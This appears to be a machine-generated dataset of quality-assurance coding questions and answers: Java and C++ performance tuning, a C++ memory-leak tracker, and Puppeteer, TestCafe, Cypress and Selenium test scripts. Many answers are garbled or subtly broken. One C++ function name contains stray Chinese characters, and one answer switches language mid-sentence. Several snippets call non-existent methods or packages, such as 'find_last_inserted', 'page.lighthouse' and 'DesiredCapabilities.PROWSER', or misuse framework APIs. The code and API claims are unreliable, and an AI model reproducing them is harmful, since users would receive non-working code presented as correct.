profiling, Multi-threading\n\n**Solution**:\n\n1. Identify the hotspots using a profiling tool like JProfiler.\n2. Analyze thread contention and synchronization issues.\n3. Optimize memory usage and reduce garbage collection overhead.\n4. Implement concurrent data structures and algorithms where appropriate.\n\nExample code snippet using Java to identify and optimize a CPU-intensive method:\n\n```java\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class PerformanceOptimization {\n\n    private static final int MAX_CONNECTIONS = 10000;\n    private final AtomicInteger processedRequests = new AtomicInteger(0);\n    private final MyHeavyProcessingService heavyProcessor = new MyHeavyProcessingService();\n\n    public void startServer() {\n        ExecutorService executor = Executors.newFixedThreadPool(MAX_CONNECTIONS);\n        for (int i = 0; i < MAX_CONNECTIONS; i++) {\n            executor.execute(this::handleConnection);\n        }\n        executor.shutdown();\n    }\n\n    private void handleConnection() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try {\n                heavyProcessor.processData();\n                processedRequests.incrementAndGet();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            } catch (Exception e) {\n                // Handle exceptions and log\n            }\n        }\n    }\n\n    public int getProcessedRequests() {\n        return processedRequests.get();\n    }\n\n    // Optimized Heavy Processing Service\n    private static class MyHeavyProcessingService {\n\n        // Use a concurrent data structure for shared data access\n        private final ConcurrentHashMap<String, DataObject> dataCache = new ConcurrentHashMap<>();\n\n        public void processData() {\n            // Profiling indicates this method is a hotspot\n            // Use parallel streams for multi-threaded processing\n            dataCache.values().parallelStream()\n                    .forEach(this::processSingleDataObject);\n        }\n\n        private void processSingleDataObject(DataObject obj) {\n            // Perform complex operations here, now optimized for parallel execution\n        }\n    }\n}\n```\n\nQuestion 2:\n\nIn a C++ network application, packets are being processed slower than expected due to excessive I/O operations and resource contention. The application is built using asynchronous I/O with libevent and reads data from multiple sockets concurrently. Improve the performance by reducing context switches and optimizing resource management.\n\n**Concept**: Performance profiling, Asynchronous I/O\n\n**Solution**:\n\n1. Profile the application using tools like perf or gperftools.\n2. Optimize buffer management to reduce memory allocation and copying.\n3. Implement I/O multiplexing with epoll or kqueue for better scalability.\n4. Optimize thread and task scheduling.\n\nExample C++ code snippet using libevent to optimize I/O processing:\n\n```cpp\n#include <event2/event.h>\n#include <event2/buffer.h>\n#include <event2/bufferevent.h>\n#include <event2/thread.h>\n#include <unordered_map>\n\nstruct ConnectionData {\n    evutil_socket_t socket;\n    struct bufferevent* bev;\n    std::unordered_map<std::string, std::string> dataCache;\n};\n\nvoid eventCallback(struct bufferevent* bev, short events, void* ptr) {\n    ConnectionData* connection = static_cast<ConnectionData*>(ptr);\n\n    if (events & BEV_EVENT_READ) {\n        struct evbuffer* input = bufferevent_get_input(bev);\n        processIncomingData(connection, evbuffer\u62bd\u51faLength(input));\n    }\n\n    if (events & (BEV_EVENT_ERROR | BEV_EVENT_EOF)) {\n        // Handle errors or closure, then clean up\n        bufferevent_free(connection->bev);\n        delete connection;\n    }\n}\n\nvoid processIncomingData(ConnectionData* connection, size_t dataSize) {\n    // Preallocate or reuse buffer to avoid frequent allocations\n    char* buffer = new char[dataSize];\n    evbuffer_copyout(bufferevent_get_input(connection->bev), buffer, dataSize);\n    \n    // Process data with optimized logic\n    // ...\n\n    delete[] buffer;\n}\n\nint main() {\n    event_base* base = event_base_new();\n    event_enable_thread_support(base); // Enable multi-threading\n\n    // Create a listening socket and start accepting connections\n    // ...\n\n    struct event* ev = event_new(base, listeningSocket, EV_READ | EV_PERSIST, eventCallback, nullptr);\n    event_add(ev, nullptr);\n\n    event_base_dispatch(base);\n    event_base_free(base);\n\n    return 0;\n}\n```\nIn both examples, the focus is on identifying performance bottlenecks and applying optimizations to improve throughput and reduce latency. The complexity lies in profiling, multi-threading, asynchronous I/O, and resource management, which are crucial aspects of Quality Assurance in performance profiling scenarios."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Memory leak detection", "Complexity_Level": "medium", "Response": "As \"Quality Assurance\" and \"Memory leak detection\" are not directly represented in the provided JSON, I will create a problem related to memory leak detection in a programming context. The chosen concept for this problem is \"Memory Management\".\n\n**Question 1:**\nA C++ program is experiencing performance degradation over time,\u7591\u4f3c\u5b58\u5728\u5185\u5b58\u6cc4\u6f0f\u3002\u7f16\u5199\u4e00\u4e2a\u4e2d\u7b49\u96be\u5ea6\u7684\u5185\u5b58\u6cc4\u6f0f\u68c0\u6d4b\u5de5\u5177\uff0c\u7528\u4e8e\u5206\u6790\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u60c5\u51b5\u3002\n\n**Solution:**\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u667a\u80fd\u6307\u9488\u548c\u4e00\u4e2a\u7b80\u5355\u7684\u5185\u5b58\u8ddf\u8e2a\u7c7b\u6765\u5e2e\u52a9\u68c0\u6d4b\u5185\u5b58\u6cc4\u6f0f\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5185\u5b58\u8ddf\u8e2a\u5668\uff0c\u5b83\u4f1a\u5728\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u65f6\u8bb0\u5f55\u4fe1\u606f\u3002\n\n```cpp\n#include <iostream>\n#include <unordered_map>\n#include <memory>\n\nclass MemoryTracker {\npublic:\n    static void trackAllocation(void* ptr, size_t size) {\n        tracker()[ptr] = size;\n        std::cout << \"Allocated: \" << size << \" bytes at \" << ptr << std::endl;\n    }\n\n    static void trackDeallocation(void* ptr) {\n        auto it = tracker().find(ptr);\n        if (it != tracker().end()) {\n            std::cout << \"Deallocated: \" << it->second << \" bytes at \" << ptr << std::endl;\n            tracker().erase(it);\n        } else {\n            std::cout << \"Memory leak detected: \" << ptr << std::endl;\n        }\n    }\n\nprivate:\n    static std::unordered_map<void*, size_t>& tracker() {\n        static std::unordered_map<void*, size_t> map;\n        return map;\n    }\n};\n\ntemplate <typename T>\nclass CustomSmartPtr {\n    T* ptr;\npublic:\n    CustomSmartPtr(T* p) : ptr(p) {\n        MemoryTracker::trackAllocation(ptr, sizeof(T));\n    }\n\n    ~CustomSmartPtr() {\n        if (ptr) {\n            MemoryTracker::trackDeallocation(ptr);\n            delete ptr;\n            ptr = nullptr;\n        }\n    }\n\n    T* operator->() const {\n        return ptr;\n    }\n\n    T& operator*() const {\n        return *ptr;\n    }\n};\n\n// Example usage\nint main() {\n    CustomSmartPtr<int> ptr(new int(42));\n    *ptr = 43;\n    // No explicit deallocation required; CustomSmartPtr will handle it\n    return 0;\n}\n```\n\n\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a`MemoryTracker`\u7c7b\uff0c\u7528\u4e8e\u5728\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u65f6\u8bb0\u5f55\u4fe1\u606f\u3002`CustomSmartPtr`\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u667a\u80fd\u6307\u9488\u5b9e\u73b0\uff0c\u5b83\u4f7f\u7528`MemoryTracker`\u5728\u6784\u9020\u548c\u6790\u6784\u65f6\u8bb0\u5f55\u5185\u5b58\u64cd\u4f5c\u3002\u5982\u679c\u5728\u6790\u6784\u65f6\u627e\u4e0d\u5230\u5bf9\u5e94\u7684\u5185\u5b58\u5206\u914d\u8bb0\u5f55\uff0c`trackDeallocation`\u4f1a\u8f93\u51fa\u5185\u5b58\u6cc4\u6f0f\u4fe1\u606f\u3002\n\n\u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e2a\u89e3\u51b3\u65b9\u6848\u5728\u4e2d\u7b49\u590d\u6742\u6027\u9879\u76ee\u4e2d\u53ef\u80fd\u4e0d\u591f\u5168\u9762\uff0c\u4f46\u5bf9\u4e8e\u6559\u5b66\u548c\u7406\u89e3\u5185\u5b58\u6cc4\u6f0f\u68c0\u6d4b\u7684\u57fa\u672c\u539f\u7406\u662f\u8db3\u591f\u7684\u3002\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u66f4\u590d\u6742\u7684\u5de5\u5177\uff0c\u5982 Valgrind \u6216\u4e13\u95e8\u7684\u5185\u5b58\u5206\u6790\u5e93\u3002"}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Memory leak detection", "Complexity_Level": "extremely difficult", "Response": "The given JSON doesn't directly cover Quality Assurance or Memory leak detection. However, I can create a problem based on memory leak detection in a C++ program, which is a common concern in software development, especially in low-level systems programming.\n\nQuestion 1: Develop a highly optimized and efficient memory leak detection tool that can identify memory leaks in a large and complex C++ program consisting of multiple threads and dynamic library dependencies.\n\nSolution:\nTo solve this problem, we can use a combination of static analysis and runtime monitoring. For runtime monitoring, we'll use a custom memory manager that hooks into the standard C++ library's memory allocation/deallocation functions. Here's an example code snippet to demonstrate a simplified version of this approach:\n\n```cpp\n#include <unordered_map>\n#include <mutex>\n#include <cstdlib>\n\nclass CustomAllocator {\npublic:\n    static void* allocate(size_t size) {\n        std::lock_guard<std::mutex> lock(mutex_);\n        allocatedBlocks_.emplace(reinterpret_cast<void*>(malloc(size)), size);\n        return allocatedBlocks_.find_last_inserted().first->first;\n    }\n\n    static void deallocate(void* ptr) {\n        std::lock_guard<std::mutex> lock(mutex_);\n        auto it = allocatedBlocks_.find(ptr);\n        if (it != allocatedBlocks_.end()) {\n            allocatedBlocks_.erase(it);\n        } else {\n            std::cerr << \"Deallocating an unallocated block!\" << std::endl;\n        }\n    }\n\n    static void reportLeaks() {\n        std::lock_guard<std::mutex> lock(mutex_);\n        if (!allocatedBlocks_.empty()) {\n            std::cerr << \"Memory leaks detected:\" << std::endl;\n            for (const auto& block : allocatedBlocks_) {\n                std::cerr << \"Size: \" << block.second << \", Address: \" << block.first << std::endl;\n            }\n        } else {\n            std::cerr << \"No memory leaks detected.\" << std::endl;\n        }\n    }\n\nprivate:\n    static std::unordered_map<void*, size_t> allocatedBlocks_;\n    static std::mutex mutex_;\n};\n\nstd::unordered_map<void*, size_t> CustomAllocator::allocatedBlocks_;\nstd::mutex CustomAllocator::mutex_;\n\n// Replace new/delete with our custom allocator\nvoid* operator new(size_t size) {\n    return CustomAllocator::allocate(size);\n}\n\nvoid operator delete(void* ptr) {\n    CustomAllocator::deallocate(ptr);\n}\n```\nThis code snippet hooks the custom memory manager into the C++'s `new` and `delete` operators. It maintains a map of allocated blocks and their sizes, ensuring thread safety with a mutex. When the program exits, you can call `CustomAllocator::reportLeaks()` to print any memory leaks.\n\nNote that this is a simplified example and doesn't cover all edge cases or complex memory leak scenarios. In a real-world scenario, you would need a more sophisticated tool like Valgrind, AddressSanitizer, or a custom solution that integrates static analysis, dynamic analysis, and symbol information for better tracking and reporting."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Usability testing", "Complexity_Level": "medium", "Response": "The domain \"Quality Assurance\" and subarea \"Usability testing\" are not directly represented in the provided JSON. However, we can create a question related to usability testing in a web development context. Here's a medium difficulty level problem and its solution:\n\n**Problem:**\nYou are working on a web application, and the client has requested a usability test to ensure that the navigation menu is intuitive and easy to use. You need to create a script that simulates user interactions, focusing on the menu structure and click behavior. The script should record the time taken to find specific menu items and the number of clicks made.\n\n**Concept**: Web Development (Frontend Development)\n\n**Solution:**\nWe can use a JavaScript testing framework like Jest with a library like Puppeteer to automate browser actions and simulate user interactions. Here's an example script that tests the usability of a navigation menu:\n\n1. First, install the necessary dependencies:\n```bash\nnpm init -y\nnpm install puppeteer jest @testing-library/puppeteer\n```\n1. Create a `test.js` file with the following content:\n```javascript\nconst puppeteer = require('@testing-library/puppeteer');\nconst { launch } = puppeteer;\n\ndescribe('Usability testing for Navigation Menu', () => {\n  let page;\n\n  beforeAll(async () => {\n    page = await launch().then(browser => browser.newPage());\n    await page.goto('http://yourwebsite.com');\n  });\n\n  afterAll(async () => {\n    await page.close();\n  });\n\n  test('Verify access to specific menu items', async () => {\n    const targetMenuItem = 'About Us';\n    let clickCount = 0;\n    let targetFound = false;\n    const startTime = Date.now();\n\n    const clickMenuItem = async (menuItem) => {\n      const selector = `[aria-label=\"${menuItem}\"]`; // Assuming menu items have an aria-label attribute\n      await page.waitForSelector(selector);\n      await page.click(selector);\n      clickCount++;\n    };\n\n    while (!targetFound) {\n      if (await page.$(`[aria-label=\"${targetMenuItem}\"]`)) {\n        targetFound = true;\n      } else {\n        await clickMenuItem('Home'); // Assuming 'Home' is the top-level item\n      }\n    }\n\n    const endTime = Date.now();\n    const timeTaken = endTime - startTime;\n\n    expect(targetFound).toBe(true);\n    console.log(`Clicked ${clickCount} times to find \"${targetMenuItem}\"`);\n    console.log(`Time taken: ${timeTaken}ms`);\n  });\n});\n\n```\n1. Run the test:\n```bash\nnpx jest\n```\nThis script simulates a user searching for a specific menu item ('About Us' in this case) by clicking on menu items until the target item is found. It records the number of clicks and the time taken to reach the target. The test verifies that the target menu item is accessible within the navigation structure.\n\nKeep in mind that you'll need to adjust the script according to your actual website's structure and the attributes used for menu items."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Usability testing", "Complexity_Level": "extremely difficult", "Response": "Question 1: Design an automated usability testing framework for a complex web application with thousands of user interfaces, where the testing should adapt to different user preferences, screen sizes, and accessibility settings. The framework should generate detailed reports highlighting potential usability issues and suggest improvements.\n\nConcept: Automated Testing, Web Development, Accessibility\n\nSolution:\n```python\nimport unittest\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\nfrom bs4 import BeautifulSoup\nfrom PIL import Image\nimport pytesseract\nimport json\nimport os\nimport re\n\nclass UsabilityTestingFramework(unittest.TestCase):\n    def setUp(self):\n        self.driver = webdriver.Firefox()\n        self.driver.set_window_size(1920, 1080) # Default screen size\n        self.accessibility_checks = ['color_contrast', 'text_size', 'focus_order', 'ARIA_attributes']\n        self.test_results = {}\n\n    def test_user_interfaces(self):\n        user_interfaces = load_user_interfaces() # Load thousands of URLs\n        for interface in user_interfaces:\n            self.driver.get(interface['url'])\n            self.test_results[interface['name']] = self.run_interface_tests()\n\n    def run_interface_tests(self):\n        tests = {}\n        for check in self.accessibility_checks:\n            if check == 'color_contrast':\n                tests[check] = self.check_color_contrast()\n            elif check == 'text_size':\n                tests[check] = self.check_text_size()\n            elif check == 'focus_order':\n                tests[check] = self.check_focus_order()\n            elif check == 'ARIA_attributes':\n                tests[check] = self.check_ARIA_attributes()\n        return tests\n\n    def check_color_contrast(self):\n        # Use an external library like tinycolor2 to check color contrast\n        pass\n\n    def check_text_size(self):\n        soup = BeautifulSoup(self.driver.page_source, 'html.parser')\n        for element in soup.find_all(text=True):\n            # Check font-size against WCAG 2.1 guidelines\n            pass\n\n    def check_focus_order(self):\n        # Use webdriver actions to traverse elements and verify tab order\n        pass\n\n    def check_ARIA_attributes(self):\n        soup = BeautifulSoup(self.driver.page_source, 'html.parser')\n        for element in soup.find_all(True, recursive=False):\n            # Check for proper ARIA attributes and values\n            pass\n\n    def tearDown(self):\n        self.driver.quit()\n        self.generate_report()\n\n    def generate_report(self):\n        # Generate a detailed report with potential issues and suggestions\n        pass\n\n    def save_screenshot(self, name):\n        # Save a screenshot for manual review\n        pass\n\ndef load_user_interfaces():\n    # Load the list of thousands of user interfaces (e.g., from a database)\n    pass\n\nif __name__ == '__main__':\n    unittest.main(verbosity=2)\n```\nThis test suite provides a foundation for an automated usability testing framework. It uses Selenium for browser interaction, BeautifulSoup for HTML parsing, and pytesseract for possible OCR-based text size checks. The actual implementations of the checks (like color contrast) would need to be filled in based on specific libraries and methods.\n\nQuestion 2: Develop a distributed system for conducting remote usability testing sessions, capturing user interactions, and analyzing the results in real-time. The system should support multiple platforms (Web, iOS, and Android), handle high concurrency, and maintain data consistency across different tests.\n\nConcept: Distributed Systems, Mobile Development, User Experience, Real-time Data Processing\n\nSolution:\nThis problem involves designing a complex distributed system, which isn't feasible to write as a single code snippet. Here's a high-level architecture and technologies that could be used:\n\n1. **Frontend**: Develop web and mobile applications (React Native for iOS and Android) to capture user interactions and send data to the backend.\n2. **Backend**: Build a distributed system using a microservices architecture (Node.js, Python, or Go). Services could include:\n\t* **Session Management**: Create, manage, and assign usability tests.\n\t* **Data Ingestion**: Receive user interaction data from frontend apps.\n\t* **Real-time Analysis**: Process and analyze data (Apache Flink or Streamlit).\n\t* **Data Storage**: Store data in a distributed database (e.g., Apache Cassandra or Google Bigtable) for high concurrency and horizontal scalability.\n\t* **Result Aggregation**: Compile results and present them to testers.\n3. **Real-time Communication**: Use WebSockets or a message broker (e.g., Apache Kafka) for real-time data transmission between frontend and backend.\n4. **Consistency**: Implement eventual consistency models using CRDTs (Conflict-free Replicated Data Types) to maintain data integrity across services.\n\nThe actual implementation would involve designing and integrating these components, as well as addressing challenges like data privacy, scalability, and load balancing."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Cross-browser testing", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: As a quality assurance expert, you need to create a medium complexity test suite to ensure a web application functions correctly across multiple browsers. The application has a feature that displays dynamic charts, and you need to verify that the charts render and interact properly in different browsers.\n\nConcept: Cross-browser testing\n\nResponse:\nTo address this problem, you can use a testing framework like Selenium WebDriver and a test automation tool like TestCafe or Cypress. For this example, we'll use TestCafe, which provides out-of-the-box browser compatibility.\n\nHere's an example `test.js` file with a TestCafe test suite to verify chart rendering and interaction in Chrome, Firefox, and Safari:\n\n```javascript\nimport { Selector } from 'testcafe';\n\nconst pieChart = Selector('#pie-chart');\nconst legendItems = Selector('.legend-item');\nconst chartLegendClick = Selector('.legend-item').withText('Sales');\n\nfixture`Chart Testing`.page`http://yourwebapplication.com`;\n\ntest('Check chart rendering and interaction', async t => {\n  // Check if pie chart is visible in Chrome\n  await t\n    .useRole('chromeUser')\n    .expect(pieChart.exists).ok('Chart not found in Chrome');\n\n  // Check if pie chart is visible in Firefox\n  await t\n    .useRole('firefoxUser')\n    .expect(pieChart.exists).ok('Chart not found in Firefox');\n\n  // Check if pie chart is visible in Safari\n  await t\n    .useRole('safariUser')\n    .expect(pieChart.exists).ok('Chart not found in Safari');\n\n  // Click on legend item 'Sales' in each browser and verify chart updates\n  for (const browser of ['chromeUser', 'firefoxUser', 'safariUser']) {\n    await t.useRole(browser);\n    await t.click(chartLegendClick);\n\n    // Assert that the chart data has changed after clicking the legend\n    const updatedData = await pieChart.getAttribute('data-chart-data');\n    await t.expect(JSON.parse(updatedData)).notEql(null, 'Chart data not updated after legend click');\n  }\n});\n\n// Define browser roles\nconst chromeUser = {\n  name: 'Chrome User',\n  browser: 'chrome',\n};\n\nconst firefoxUser = {\n  name: 'Firefox User',\n  browser: 'firefox',\n};\n\nconst safariUser = {\n  name: 'Safari User',\n  browser: 'safari',\n};\n```\n\nTo run the tests, you'll need to have TestCafe installed (`npm install -g testcafe`) and execute the following command:\n\n```sh\ntestcafe chrome,firefox,safari test.js\n```\n\nQuestion 2:\nProblem: You need to develop a script that automates the process of checking the responsiveness of a web application on different mobile devices, focusing on the critical layout and functionality in portrait and landscape modes.\n\nConcept: Cross-browser testing\n\nResponse:\nFor this problem, you can use Cypress.io, a popular end-to-end testing framework, along with `cypress-viewport` plugin to test various device viewports.\n\nFirst, install Cypress and the `cypress-viewport` plugin:\n\n```sh\nnpx cypress install\nnpm install cypress-viewport --save-dev\n```\n\nCreate a `responsive_layout_spec.js` file in the `cypress/integration` folder:\n\n```javascript\nimport { setViewport, setViewports } from 'cypress-viewport';\n\ndescribe('Responsive Layout Testing', () => {\n  const devices = [\n    { name: 'iPhone X', width: 375, height: 812 },\n    { name: 'iPad', width: 768, height: 1024 },\n    { name: 'Nexus 5', width: 360, height: 640 },\n  ];\n\n  beforeEach(() => {\n    cy.visit('http://yourwebapplication.com');\n  });\n\n  devices.forEach((device) => {\n    it(`Checks layout for ${device.name} in portrait mode`, () => {\n      setViewport(device.width, device.height);\n      // Add assertions for critical layout elements\n      cy.get('.critical-element').should('have.css', 'display', 'flex');\n    });\n\n    it(`Checks layout for ${device.name} in landscape mode`, () => {\n      setViewport(device.height, device.width);\n      // Add assertions for critical layout elements\n      cy.get('.critical-element').should('have.css', 'flex-direction', 'row');\n    });\n  });\n});\n```\n\nIn this example, we import the `setViewport` and `setViewports` functions from the `cypress-viewport` plugin, and we define an array of devices with their respective viewport sizes. The tests visit the web application and set the viewport size for each device in both portrait and landscape modes. You can replace the `cy.get('.critical-element')` with the appropriate selectors for your web application's elements.\n\nTo run the tests, execute the following command:\n\n```sh\nnpx cypress run --spec 'cypress/integration/responsive_layout_spec.js'\n```\n\nThese tests will help ensure the web application's layout and functionality adapt correctly to different mobile devices."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Cross-browser testing", "Complexity_Level": "extremely difficult", "Response": "Domain: Quality Assurance\nSub Area: Cross-browser testing\n\n**Question 1:**\nDevelop a complex web application with multiple interactive elements and a dynamic layout. The application needs to function seamlessly across the five most popular web browsers: Chrome, Firefox, Safari, Edge, and Opera. Write a highly efficient end-to-end test suite using a headless testing framework, like Puppeteer, that not only verifies the functionality but also the responsive design and performance across these browsers.\n\n**Solution:**\nFirst, let's create a Node.js project with Puppeteer and a few additional libraries for managing browser instances and reporting.\n\n```bash\nnpm init -y\nnpm install puppeteer playwright allure-reporter\n```\n\nNow, create a `test.js` file for the test suite:\n\n```javascript\nconst puppeteer = require('puppeteer');\nconst { chromium, firefox, webkit } = require('playwright');\nconst AllureReporter = require('@puppeteer/test-reporter');\n\n(async () => {\n  const allure = new AllureReporter();\n  const browsers = [puppeteer, chromium, firefox, webkit];\n\n  browsers.forEach(async (browserType) => {\n    const browser = await browserType.launch({ headless: true });\n    const page = await browser.newPage();\n\n    await page.setJavaScriptEnabled(true);\n    await page.setViewport({ width: 1280, height: 720 });\n\n    // Load your complex web application\n    await page.goto('https://your_complex_web_application.com');\n\n    // Perform functional tests\n    // Example: Interact with an element and verify response\n    await page.click('#myButton');\n    const responseText = await page.evaluate(() => document.querySelector('#myResult').innerText);\n    console.log(`Browser: ${browserType.name()}, Result: ${responseText}`);\n    allure.step(`Verifying button click response in ${browserType.name()}`, () => {\n      allure.attach(responseText, 'Response text', 'text/plain');\n    });\n\n    // Verify responsive design\n    // Example: Check layout for mobile view\n    await page.setViewport({ width: 360, height: 640 });\n    const mobileLayout = await page.screenshot();\n    allure.step(`Verifying mobile layout in ${browserType.name()}`, () => {\n      allure.attach(mobileLayout, 'Mobile layout screenshot', 'image/png');\n    });\n\n    // Measure performance\n    // Example: Collect Lighthouse audit report\n    const lighthouseResult = await page.lighthouse('https://your_complex_web_application.com', {\n      log: 'info',\n      onlyCategories: ['performance'],\n    });\n    allure.step(`Lighthouse performance audit in ${browserType.name()}`, () => {\n      allure.attach(JSON.stringify(lighthouseResult), 'Lighthouse report', 'application/json');\n    });\n\n    await browser.close();\n  });\n\n  allure.writeReport();\n})();\n```\n\n**Question 2:**\nDesign an automated cross-browser testing infrastructure that can handle parallel testing for hundreds of test cases across various browsers and versions, using Docker for scalability and Selenium Grid for test execution. This infrastructure should also include a dashboard for monitoring test progress and results.\n\n**Solution:**\n1. **Set up Selenium Grid:**\n   Create a `Dockerfile` for the Selenium Hub:\n\n   ```Dockerfile\n   FROM selenium/hub:4.0.0-rc-1-prerelease-20210308\n   ```\n\n   Build and run the Hub:\n\n   ```bash\n   docker build -t selenium-hub .\n   docker run -p 4444:4444 -d selenium-hub\n   ```\n\n2. **Set up Docker images for browser nodes:**\n   For each browser, create a Dockerfile that installs the desired browser and Selenium WebDriver. Repeat this process for Chrome, Firefox, Safari, Edge, and Opera.\n\n3. **Set up Docker Compose:**\n   Create a `docker-compose.yml` file to run the Hub and browser nodes in parallel:\n\n   ```yaml\n   version: '3.8'\n   services:\n     hub:\n       image: selenium-hub\n       container_name: selenium-hub\n       ports:\n         - \"4444:4444\"\n\n     chrome:\n       build: ./chrome\n       depends_on:\n         - hub\n       environment:\n         - SE_EVENT_BUS_HOST=selenium-hub\n         - SE_EVENT_BUS_PUBLISH_PORT=4444\n         - SE_EVENT_BUS_SUBSCRIBE_PORT=4444\n\n     firefox:\n       build: ./firefox\n       depends_on:\n         - hub\n       environment:\n         - SE_EVENT_BUS_HOST=selenium-hub\n         - SE_EVENT_BUS_PUBLISH_PORT=4444\n         - SE_EVENT_BUS_SUBSCRIBE_PORT=4444\n\n     # Add similar configurations for Safari, Edge, and Opera\n   ```\n\n4. **Build and run the Compose setup:**\n   ```bash\n   docker-compose build\n   docker-compose up -d\n   ```\n\n5. **Parallel testing with Python and Selenium:**\n   Use `concurrent.futures` to run tests in parallel:\n\n   ```python\n   import concurrent.futures\n   from selenium import webdriver\n   from selenium.webdriver.common.desired_capabilities import DesiredCapabilities\n\n   browsers = ['chrome', 'firefox']  # Add Safari, Edge, and Opera\n\n   with concurrent.futures.ThreadPoolExecutor() as executor:\n       for browser in browsers:\n           dcap = dict(DesiredCapabilities.PROWSER)\n           dcap[\"platform\"] = \"ANY\"\n           driver = webdriver.Remote(\n               command_executor=f'http://selenium-hub:4444/wd/hub',\n               desired_capabilities=dcap\n           )\n           # Run your test case with driver\n           driver.get('https://your_complex_web_application.com')\n           # Add your test logic here\n           driver.quit()\n   ```\n\n6. **Dashboard implementation:**\n   Use a combination of tools like Prometheus, Grafana, and Junit XML reports to create a dashboard for monitoring test progress and results. Configure your test framework to generate Junit XML reports, expose test metrics using Prometheus, and visualize them in Grafana.\n\nNote: The solutions provided here are high-level and may require additional configurations, error handling, and optimization based on the specific requirements of your application."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Mobile responsiveness testing", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Mobile Responsiveness Testing\n\nProblem: Develop a JavaScript function that uses the browser's `window.innerWidth` and `window.innerHeight` properties to determine if a web page is being viewed on a mobile device with a portrait or landscape orientation, and display a console message accordingly.\n\nSolution:\n```javascript\nfunction checkMobileOrientation() {\n  const viewportWidth = window.innerWidth;\n  const viewportHeight = window.innerHeight;\n\n  if (viewportWidth < 768) { // Assuming a breakpoint for mobile devices at 768px\n    if (viewportWidth < viewportHeight) {\n      console.log(\"Portrait orientation on a mobile device.\");\n    } else {\n      console.log(\"Landscape orientation on a mobile device.\");\n    }\n  } else {\n    console.log(\"Desktop or tablet device.\");\n  }\n}\n\n// Call the function to test\ncheckMobileOrientation();\n```\nThis function checks the viewport dimensions and compares them to a typical breakpoint for mobile devices (768px). If the width is less than 768px, it assumes the device is a mobile device and further checks the orientation by comparing width and height.\n\nQuestion 2:\nConcept: Mobile Responsiveness Testing\n\nProblem: Write a Python script using Selenium WebDriver to automate testing of a web page's responsiveness on various mobile devices with different screen sizes. Test if the main navigation menu collapses and expands correctly when the screen width is reduced.\n\nSolution:\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\n# Define the screen sizes for different devices\ndevices = [\n    {\"width\": 320, \"height\": 480, \"name\": \"iPhone 4\"},\n    {\"width\": 375, \"height\": 667, \"name\": \"iPhone 7\"},\n    {\"width\": 414, \"height\": 896, \"name\": \"iPhone X\"}\n]\n\n# URL of the web page to test\nurl = \"http://www.example.com\"\n\n# Configure the WebDriver\ndriver = webdriver.Firefox()  # You can replace with webdriver.Chrome() for Chrome\n\nfor device in devices:\n    # Set the viewport size for the current device\n    driver.set_window_size(device[\"width\"], device[\"height\"])\n\n    driver.get(url)\n\n    # Locate the main navigation menu button\n    main_menu_button = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.ID, \"main-menu-button\"))\n    )\n\n    # Initially, the menu should be collapsed\n    assert main_menu_button.is_displayed()\n\n    # Click the main menu button to expand the menu\n    main_menu_button.click()\n\n    # Wait for the expanded menu to be visible\n    expanded_menu = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.CLASS_NAME, \"expanded-menu\"))\n    )\n\n    # Check if the expanded menu is visible\n    assert expanded_menu.is_displayed()\n\n    # Click the main menu button again to collapse the menu\n    main_menu_button.click()\n\n    # Wait for the expanded menu to disappear\n    WebDriverWait(driver, 10).until_not(\n        EC.presence_of_element_located((By.CLASS_NAME, \"expanded-menu\"))\n    )\n\n    # Check if the menu is collapsed again\n    assert not main_menu_button.is_displayed()\n\n# Close the WebDriver\ndriver.quit()\n```\nThis script uses Selenium WebDriver with Firefox (or Chrome) to automate the testing of the main navigation menu responsiveness on different mobile device screen sizes. It sets the viewport size, clicks the menu button, checks the visibility of the expanded menu, and verifies that the menu collapses correctly."}, {"L2_TASK": "Quality Assurance", "L3_TASK": "Mobile responsiveness testing", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop a comprehensive testing framework to analyze the mobile responsiveness of a complex web application across multiple devices, orientations, and screen sizes, ensuring optimal user experience and performance.\n\nSolution (using Python with Selenium and Appium):\nConcept: Mobile responsiveness testing, Webdriver, Appium\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom appium import webdriver as appium_webdriver\nimport time\nimport device_info\n\n# Define a list of devices to test\ndevices = [\n    {\"platformName\": \"iOS\", \"platformVersion\": \"14.4\", \"deviceName\": \"iPhone 11\"},\n    {\"platformName\": \"Android\", \"platformVersion\": \"11\", \"deviceName\": \"Google Pixel 4a\"},\n    # Add more devices as needed\n]\n\n# Function to initialize a mobile driver based on the device\ndef init_mobile_driver(device):\n    desired_caps = device.copy()\n    if device[\"platformName\"] == \"iOS\":\n        desired_caps[\"automationName\"] = \"XCUITest\"\n        